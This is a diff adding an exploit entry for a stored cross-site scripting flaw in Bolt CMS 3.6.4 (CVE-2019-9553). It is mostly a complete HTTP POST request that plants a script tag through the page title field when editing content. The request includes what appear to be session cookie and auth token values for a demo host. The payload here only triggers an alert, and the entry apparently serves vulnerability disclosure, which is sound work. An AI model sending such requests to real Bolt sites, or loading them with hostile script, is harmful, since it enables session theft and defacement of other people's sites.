@@ -1,0 +1,30 @@
+# Exploit Title: Bolt CMS - 3.6.4 - Cross-Site Scripting
+# Date: 2019-03-04
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://bolt.cm/
+# Software Link : https://github.com/bolt/bolt
+# Software : Bolt CMS - v 3.6.4
+# Version : v 3.6.4
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : CVE-2019-9553
+
+# The XSS vulnerability has been discovered in the Bolt CMS web application software due to its vulnerability in the source code in version 3.6.4.
+ 
+# HTTP POST Request :
+ 
+POST /bolt/editcontent/pages HTTP/1.1
+Host: bolt-up3x24.bolt.dockerfly.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://bolt-up3x24.bolt.dockerfly.com/bolt/editcontent/pages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 562
+DNT: 1
+Connection: close
+Cookie: bolt_session_5c201ab91521b607e364bc74271e51f1=3d540aa1d0a0fc38dde995dc6ba8a32e; bolt_authtoken_5c201ab91521b607e364bc74271e51f1=240049afe75abc53fbe51e75103ed138261da69b180ff241b7e815027c39f6fb
+Upgrade-Insecure-Requests: 1
+
+content_edit%5B_token%5D=u1EA_Zhor_EwrIyqIt-PLLK02DccGgZDDWFQm1325_8&editreferrer=&contenttype=pages&title=%22%3E%3Cscript%3Ealert%28%22ismailtasdelen%22%29%3C%2Fscript%3E&slug=script-alert-ismailtasdelen-script&image%5Bfile%5D=2019-03%2Fimg-src-x-onerror-prompt-1-.png&files%5B%5D=&teaser=%3Cp%3EBolt+3.6.4+CMS%3C%2Fp%3E%0D%0A&body=%3Cp%3EBolt+3.6.4+CMS%3C%2Fp%3E%0D%0A&template=&taxonomy%5Bgroups%5D%5B%5D=&taxonomy-order%5Bgroups%5D=0&id=&status=draft&datepublish=2019-03-04+08%3A24%3A47&datedepublish=&ownerid=1&_live-editor-preview=&content_edit%5Bsave%5D=1
